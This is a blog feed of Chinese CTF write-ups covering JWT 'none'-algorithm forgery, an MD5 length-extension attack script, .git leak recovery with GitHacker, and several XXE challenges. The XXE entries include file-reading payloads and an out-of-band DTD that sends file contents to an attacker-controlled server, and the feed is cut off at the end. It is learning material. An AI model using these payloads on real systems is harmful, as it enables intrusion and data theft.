<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MyBlog</title>
  
  <subtitle>MyBlog</subtitle>
  <link href="http://1768161086.github,io/atom.xml" rel="self"/>
  
  <link href="http://1768161086.github,io/"/>
  <updated>2025-03-13T11:35:51.099Z</updated>
  <id>http://1768161086.github,io/</id>
  
  <author>
    <name>userq</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JWT 的 None 攻击</title>
    <link href="http://1768161086.github,io/2025/03/13/JWT-%E7%9A%84-None-%E6%94%BB%E5%87%BB/"/>
    <id>http://1768161086.github,io/2025/03/13/JWT-%E7%9A%84-None-%E6%94%BB%E5%87%BB/</id>
    <published>2025-03-13T11:33:24.000Z</published>
    <updated>2025-03-13T11:35:51.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Basectf-no-JWT"><a href="#Basectf-no-JWT" class="headerlink" title="Basectf no JWT"></a>Basectf no JWT</h1><p>考察了 JWT 攻击, 由于没有校验签名, 我们可以采用 None 攻击</p><p>可以利用 JWT 的 None 攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">decoded = jwt.decode(token.split(&quot; &quot;)[1], options=&#123;&quot;verify_signature&quot;: False, &quot;verify_exp&quot;: False&#125;)</span><br><span class="line">    if decoded.get(&#x27;role&#x27;) == &#x27;admin&#x27;:</span><br><span class="line">    # get flag</span><br></pre></td></tr></table></figure><p>我们可以先在 login 接口进行登录, 换取到 jwt</p><p>可以先前往 jwt.io 修改 jwt 信息, 再利用 <a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a> 来进行 None 攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJrZW5nd2FuZyIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcyNjU2MTExM30.Yyol3MbO1oYZd1dMcTTO_L2yMmj8ZxzDUCb7buVIZ3M -X a</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJrZW5nd2FuZyIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcyNjU2MTExM30.</span><br></pre></td></tr></table></figure><p>将这个 Token 放到 <code>Authorization</code> 头中进行发包即可得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Basectf-no-JWT&quot;&gt;&lt;a href=&quot;#Basectf-no-JWT&quot; class=&quot;headerlink&quot; title=&quot;Basectf no JWT&quot;&gt;&lt;/a&gt;Basectf no JWT&lt;/h1&gt;&lt;p&gt;考察了 JWT 攻击, 由于没有校验签名, </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>md5进阶</title>
    <link href="http://1768161086.github,io/2025/03/12/md5%E8%BF%9B%E9%98%B6/"/>
    <id>http://1768161086.github,io/2025/03/12/md5%E8%BF%9B%E9%98%B6/</id>
    <published>2025-03-12T13:34:40.000Z</published>
    <updated>2025-03-12T13:40:02.900Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Basectf-你真的懂md5吗"><a href="#Basectf-你真的懂md5吗" class="headerlink" title="Basectf 你真的懂md5吗"></a>Basectf 你真的懂md5吗</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// 所以你说你懂 MD5 了?</span><br><span class="line"></span><br><span class="line">$apple = $_POST[&#x27;apple&#x27;];</span><br><span class="line">$banana = $_POST[&#x27;banana&#x27;];</span><br><span class="line">if (!($apple !== $banana &amp;&amp; md5($apple) === md5($banana))) &#123;</span><br><span class="line">    die(&#x27;加强难度就不会了?&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 什么? 你绕过去了?</span><br><span class="line">// 加大剂量!</span><br><span class="line">// 我要让他成为 string</span><br><span class="line">$apple = (string)$_POST[&#x27;appple&#x27;];</span><br><span class="line">$banana = (string)$_POST[&#x27;bananana&#x27;];</span><br><span class="line">if (!((string)$apple !== (string)$banana &amp;&amp; md5((string)$apple) == md5((string)$banana))) &#123;</span><br><span class="line">    die(&#x27;难吗?不难!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 你还是绕过去了?</span><br><span class="line">// 哦哦哦, 我少了一个等于号</span><br><span class="line">$apple = (string)$_POST[&#x27;apppple&#x27;];</span><br><span class="line">$banana = (string)$_POST[&#x27;banananana&#x27;];</span><br><span class="line">if (!((string)$apple !== (string)$banana &amp;&amp; md5((string)$apple) === md5((string)$banana))) &#123;</span><br><span class="line">    die(&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 你以为这就结束了</span><br><span class="line">if (!isset($_SESSION[&#x27;random&#x27;])) &#123;</span><br><span class="line">    $_SESSION[&#x27;random&#x27;] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 你想看到 random 的值吗?</span><br><span class="line">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span><br><span class="line">$random = $_SESSION[&#x27;random&#x27;];</span><br><span class="line">echo md5($random);</span><br><span class="line">echo &#x27;&lt;br /&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">$name = $_POST[&#x27;name&#x27;] ?? &#x27;user&#x27;;</span><br><span class="line"></span><br><span class="line">// check if name ends with &#x27;admin&#x27;</span><br><span class="line">if (substr($name, -5) !== &#x27;admin&#x27;) &#123;</span><br><span class="line">    die(&#x27;不是管理员也来凑热闹?&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$md5 = $_POST[&#x27;md5&#x27;];</span><br><span class="line">if (md5($random . $name) !== $md5) &#123;</span><br><span class="line">    die(&#x27;伪造? NO NO NO!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 认输了, 看样子你真的很懂 MD5</span><br><span class="line">// 那 flag 就给你吧</span><br><span class="line">echo &quot;看样子你真的很懂 MD5&quot;;</span><br><span class="line">echo file_get_contents(&#x27;/flag&#x27;);</span><br></pre></td></tr></table></figure><p>最后两步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">from struct import pack, unpack</span><br><span class="line">from math import floor, sin</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">MD5 Extension Attack</span><br><span class="line">====================</span><br><span class="line">@refs</span><br><span class="line">https://github.com/shellfeel/hash-ext-attack</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class MD5:</span><br><span class="line"> </span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.A, self.B, self.C, self.D = \</span><br><span class="line">            (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476)  # initial values</span><br><span class="line">        self.r: list[int] = \</span><br><span class="line">            [7, 12, 17, 22] * 4 + [5,  9, 14, 20] * 4 + \</span><br><span class="line">            [4, 11, 16, 23] * 4 + [6, 10, 15, 21] * 4  # shift values</span><br><span class="line">        self.k: list[int] = \</span><br><span class="line">            [floor(abs(sin(i + 1)) * pow(2, 32))</span><br><span class="line">             for i in range(64)]  # constants</span><br><span class="line"> </span><br><span class="line">    def _lrot(self, x: int, n: int) -&gt; int:</span><br><span class="line">        # left rotate</span><br><span class="line">        return (x &lt;&lt; n) | (x &gt;&gt; 32 - n)</span><br><span class="line"> </span><br><span class="line">    def update(self, chunk: bytes) -&gt; None:</span><br><span class="line">        # update the hash for a chunk of data (64 bytes)</span><br><span class="line">        w = list(unpack(&#x27;&lt;&#x27;+&#x27;I&#x27;*16, chunk))</span><br><span class="line">        a, b, c, d = self.A, self.B, self.C, self.D</span><br><span class="line"> </span><br><span class="line">        for i in range(64):</span><br><span class="line">            if i &lt; 16:</span><br><span class="line">                f = (b &amp; c) | ((~b) &amp; d)</span><br><span class="line">                flag = i</span><br><span class="line">            elif i &lt; 32:</span><br><span class="line">                f = (b &amp; d) | (c &amp; (~d))</span><br><span class="line">                flag = (5 * i + 1) % 16</span><br><span class="line">            elif i &lt; 48:</span><br><span class="line">                f = (b ^ c ^ d)</span><br><span class="line">                flag = (3 * i + 5) % 16</span><br><span class="line">            else:</span><br><span class="line">                f = c ^ (b | (~d))</span><br><span class="line">                flag = (7 * i) % 16</span><br><span class="line"> </span><br><span class="line">            tmp = b + \</span><br><span class="line">                self._lrot((a + f + self.k[i] + w[flag])</span><br><span class="line">                           &amp; 0xffffffff, self.r[i])</span><br><span class="line">            a, b, c, d = d, tmp &amp; 0xffffffff, b, c</span><br><span class="line"> </span><br><span class="line">        self.A = (self.A + a) &amp; 0xffffffff</span><br><span class="line">        self.B = (self.B + b) &amp; 0xffffffff</span><br><span class="line">        self.C = (self.C + c) &amp; 0xffffffff</span><br><span class="line">        self.D = (self.D + d) &amp; 0xffffffff</span><br><span class="line"> </span><br><span class="line">    def extend(self, msg: bytes) -&gt; None:</span><br><span class="line">        # extend the hash with a new message (padded)</span><br><span class="line">        assert len(msg) % 64 == 0</span><br><span class="line">        for i in range(0, len(msg), 64):</span><br><span class="line">            self.update(msg[i:i + 64])</span><br><span class="line"> </span><br><span class="line">    def padding(self, msg: bytes) -&gt; bytes:</span><br><span class="line">        # pad the message</span><br><span class="line">        length = pack(&#x27;&lt;Q&#x27;, len(msg) * 8)</span><br><span class="line"> </span><br><span class="line">        msg += b&#x27;\x80&#x27;</span><br><span class="line">        msg += b&#x27;\x00&#x27; * ((56 - len(msg)) % 64)</span><br><span class="line">        msg += length</span><br><span class="line"> </span><br><span class="line">        return msg</span><br><span class="line"> </span><br><span class="line">    def digest(self) -&gt; bytes:</span><br><span class="line">        # return the hash</span><br><span class="line">        return pack(&#x27;&lt;IIII&#x27;, self.A, self.B, self.C, self.D)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def verify_md5(test_string: bytes) -&gt; None:</span><br><span class="line">    # (DEBUG function) verify the MD5 implementation</span><br><span class="line">    from hashlib import md5 as md5_hashlib</span><br><span class="line"> </span><br><span class="line">    def md5_manual(msg: bytes) -&gt; bytes:</span><br><span class="line">        md5 = MD5()</span><br><span class="line">        md5.extend(md5.padding(msg))</span><br><span class="line">        return md5.digest()</span><br><span class="line"> </span><br><span class="line">    manual_result = md5_manual(test_string).hex()</span><br><span class="line">    hashlib_result = md5_hashlib(test_string).hexdigest()</span><br><span class="line"> </span><br><span class="line">    assert manual_result == hashlib_result, &quot;Test failed!&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def attack(message_len: int, known_hash: str,</span><br><span class="line">           append_str: bytes) -&gt; tuple:</span><br><span class="line">    # MD5 extension attack</span><br><span class="line">    md5 = MD5()</span><br><span class="line"> </span><br><span class="line">    previous_text = md5.padding(b&quot;*&quot; * message_len)</span><br><span class="line">    current_text = previous_text + append_str</span><br><span class="line"> </span><br><span class="line">    md5.A, md5.B, md5.C, md5.D = unpack(&quot;&lt;IIII&quot;, bytes.fromhex(known_hash))</span><br><span class="line">    md5.extend(md5.padding(current_text)[len(previous_text):])</span><br><span class="line"> </span><br><span class="line">    return current_text[message_len:], md5.digest().hex()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"> </span><br><span class="line">    message_len = int(input(&quot;[&gt;] Input known text length: &quot;))</span><br><span class="line">    known_hash = input(&quot;[&gt;] Input known hash: &quot;).strip()</span><br><span class="line">    append_text = input(&quot;[&gt;] Input append text: &quot;).strip().encode()</span><br><span class="line"> </span><br><span class="line">    print(&quot;[*] Attacking...&quot;)</span><br><span class="line"> </span><br><span class="line">    extend_str, final_hash = attack(message_len, known_hash, append_text)</span><br><span class="line"> </span><br><span class="line">    from urllib.parse import quote</span><br><span class="line">    from base64 import b64encode</span><br><span class="line"> </span><br><span class="line">    print(&quot;[+] Extend text:&quot;, extend_str)</span><br><span class="line">    print(&quot;[+] Extend text (URL encoded):&quot;, quote(extend_str))</span><br><span class="line">    print(&quot;[+] Extend text (Base64):&quot;, b64encode(extend_str).decode())</span><br><span class="line">    print(&quot;[+] Final hash:&quot;, final_hash)</span><br></pre></td></tr></table></figure><p>运行脚本获取random的hash值得到经过扩展的hash值</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Basectf-你真的懂md5吗&quot;&gt;&lt;a href=&quot;#Basectf-你真的懂md5吗&quot; class=&quot;headerlink&quot; title=&quot;Basectf 你真的懂md5吗&quot;&gt;&lt;/a&gt;Basectf 你真的懂md5吗&lt;/h2&gt;&lt;figure class=&quot;hi</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>git泄露</title>
    <link href="http://1768161086.github,io/2025/03/12/git%E6%B3%84%E9%9C%B2/"/>
    <id>http://1768161086.github,io/2025/03/12/git%E6%B3%84%E9%9C%B2/</id>
    <published>2025-03-12T11:11:29.000Z</published>
    <updated>2025-03-12T11:21:21.018Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h1 id="Back-to-the-Future"><a href="#Back-to-the-Future" class="headerlink" title="Back to the Future"></a>Back to the Future</h1></blockquote><p>本题考查了 Git 泄露和 git 的一些基本操作</p><p>1.我们打开后可以看到什么都没有, 我们可以考虑进行目录扫描或者直接看 <code>robots.txt</code></p><p>可以看到存在 <code>.git</code> 文件夹, 我们可以通过 <code>GitHacker</code> 来获取 <code>.git</code> 的全部内容</p><p>2.克隆GitHacker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/WangYihang/GitHacker</span><br></pre></td></tr></table></figure><p>3.下载GitHacker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install -i https://pypi.org/simple/ GitHacker</span><br></pre></td></tr></table></figure><p>（一定要在含有【<strong>requirements.txt</strong>】这个文件的目录下载）：</p><p>4.执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">githacker --url http://challenge.basectf.fun:35137/ --output back-future</span><br></pre></td></tr></table></figure><p>随后会生成一个文件夹，名字就是由此命令的最后一个参数设置的，存放在我们执行此命令的路径</p><p>5.下一步需要进入到这个文件夹的<strong>一个子文件夹</strong>，可以用cd命令进行切换，也可以鼠标双击打开此文件夹-&gt;右键-&gt;在此打开终端</p><p>6.输入【<strong>git log</strong>】命令，看到这个”add flag”的版本</p><p>7.找到含有flag信息的版本后</p><p>使用命令【<strong>git diff或者checkout + 版本commit</strong>】查看信息改动，获得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff 9d85f10e0192ef630e10d7f876a117db41c30417</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;Back-to-the-Future&quot;&gt;&lt;a href=&quot;#Back-to-the-Future&quot; class=&quot;headerlink&quot; title=&quot;Back to the Future&quot;&gt;&lt;/a&gt;Back to the Future&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="http://1768161086.github,io/2025/03/10/XXE/"/>
    <id>http://1768161086.github,io/2025/03/10/XXE/</id>
    <published>2025-03-10T10:30:10.000Z</published>
    <updated>2025-03-10T10:32:33.896Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、XML基础知识"><a href="#一、XML基础知识" class="headerlink" title="一、XML基础知识"></a>一、XML基础知识</h1><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p><strong>示例代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><p>常规XXE</p><p>flag的路径是<code>/flag</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 允许加载外部实体</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">// xml文件来源于数据流</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">if(isset($xmlfile))&#123;</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">      // 加载xml实体，参数为替代实体、加载外部子集</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">      // 把 DOM 节点转换为 SimpleXMLElement 对象</span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">      // 节点嵌套</span><br><span class="line">    $ctfshow = $creds-&gt;ctfshow;</span><br><span class="line">    echo $ctfshow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>burpsuite发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[POST]Payload:</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE payload [</span><br><span class="line">&lt;!ELEMENT payload ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/creds&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web374-376"><a href="#web374-376" class="headerlink" title="web374~376"></a>web374~376</h2><p>区别在于没有回显，<strong>要把读取到的内容也就是flag传到远程服务器查看</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">if(isset($xmlfile))&#123;</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后几题把<a href="https://so.csdn.net/so/search?q=xml&spm=1001.2101.3001.7020">xml</a>头给过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;, $xmlfile))&#123;</span><br><span class="line">    die(&#x27;error&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里给出通杀方法：</p><p>在服务器上新建dtd文件，将读取到的flag发送到php</p><p><em>以下的<a href="http://xxx/%E6%8C%87%E4%BB%A3%E6%9C%8D%E5%8A%A1%E5%99%A8IP%EF%BC%8C%E6%A0%B9%E6%8D%AE%E8%87%AA%E5%B7%B1%E6%83%85%E5%86%B5%E6%9B%BF%E6%8D%A2">http://xxx/指代服务器IP，根据自己情况替换</a></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># pd.dtd</span><br><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx/xxe.php?q=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>新建用于接收的php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># xxe.php</span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$xxe = base64_decode($_GET[&#x27;q&#x27;]);</span><br><span class="line">$txt = &#x27;flag.txt&#x27;;</span><br><span class="line">file_put_contents($txt,$xxe,FILE_APPEND)</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>burpsuite发包，后几题过滤了xml头，其实可以省略的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[POST]Payload:</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://xxx/pd.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">] &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>要求从公网能访问dtd和php文件</strong></p><p>如果运行正常，flag已经写入了txt<br>CTFshow XXE web378</p><hr><hr><p>题目描述：python X</p><p>考点：无回显XXE，外部实体，绕过过滤。</p><p>开题是一个登录框</p><p>F12直接能看见源码，一眼XXE。</p><p>随便输入抓个包，一眼XXE，节点名字都告诉我们了。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在路由<code>/doLogin</code>下发POST包。</p><p>python脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://6237f178-ba4b-4c2d-8749-f45d3a41e8b2.challenge.ctf.show/doLogin&#x27;</span><br><span class="line"></span><br><span class="line">payload=&quot;&quot;&quot;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">print(requests.post(url,data=payload).text)</span><br></pre></td></tr></table></figure><h2 id="GHCTF2025-﹏"><a href="#GHCTF2025-﹏" class="headerlink" title="GHCTF2025(&gt;﹏&lt;)"></a>GHCTF2025(&gt;﹏&lt;)</h2><p>根据源码可知&#x2F;ghctf 路由接受POST参数xml，同时解析时允许解析外部实体。很明显存在XXE；也没有存在任何的过滤；直接打就⾏了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 